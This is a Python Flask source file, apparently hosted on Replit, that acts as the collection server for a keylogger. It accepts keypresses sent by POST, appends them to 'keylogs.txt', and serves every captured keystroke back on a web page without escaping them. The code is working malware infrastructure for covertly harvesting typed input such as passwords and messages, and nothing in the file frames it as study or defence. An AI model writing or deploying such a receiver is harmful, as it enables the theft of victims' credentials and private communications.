from flask import Flask, request
import os
import logging

app = Flask(__name__)

# Log file path
LOG_FILE = '/home/runner/your-replit-project/keylogs.txt'

# Setup logging for debugging
logging.basicConfig(filename='/home/runner/your-replit-project/flask_debug.log', level=logging.DEBUG)

@app.route('/', methods=['POST', 'GET'])
def log_keypress():
    if request.method == 'POST':
        key = request.form.get('key')
        if key:
            try:
                with open(LOG_FILE, 'a') as log_file:
                    log_file.write(f"{key}\n")
                logging.debug(f"Logged key: {key}")
                return 'Key logged successfully.', 200
            except Exception as e:
                logging.error(f"Error writing to log file: {e}")
                return f"Error writing to log file: {e}", 500
        return 'No key provided.', 400
    elif request.method == 'GET':
        try:
            with open(LOG_FILE, 'r') as log_file:
                logs = log_file.read().replace('\n', '<br>')
                return f"<h3>Logged Keypresses:</h3><p>{logs}</p>"
        except FileNotFoundError:
            logging.error("File not found: keylogs.txt")
            return "<p>No keylogs found.</p>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
